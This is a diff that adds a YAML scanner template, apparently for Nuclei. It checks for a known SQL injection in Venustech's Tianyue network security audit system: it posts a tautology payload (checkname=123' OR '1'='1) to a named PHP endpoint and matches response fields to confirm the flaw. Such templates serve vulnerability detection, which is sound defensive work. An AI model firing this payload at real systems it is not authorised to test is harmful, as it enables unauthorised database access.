@@ -1,0 +1,35 @@
+id: venustech-tianyue-sql-injection
+
+info:
+  name: 启明星辰天玥网络安全审计系统SQL注入漏洞
+  author: nie
+  severity: high
+  description: 通过SQL注入漏洞获取数据库敏感信息。
+  reference: https://www.ddpoc.com/poc/DVB-2021-664.html
+  tags: sql-injection, venustech
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/ops/index.php?c=Reportguide&a=checkrn"
+    headers:
+      User-Agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0"
+      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+      Accept-Language: "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"
+      Accept-Encoding: "gzip,deflate"
+      Upgrade-Insecure-Requests: "1"
+      Connection: "close"
+      Content-Type: "application/x-www-form-urlencoded"
+    body: "checkname=123' OR '1'='1&tagid=123"
+
+    matchers:
+      - type: word
+        words:
+          - "{\"msg\":"
+          - "\"code\":16"
+          - "\"status\":0"
+        condition: and
+      - type: status
+        status:
+          - 200
+ 
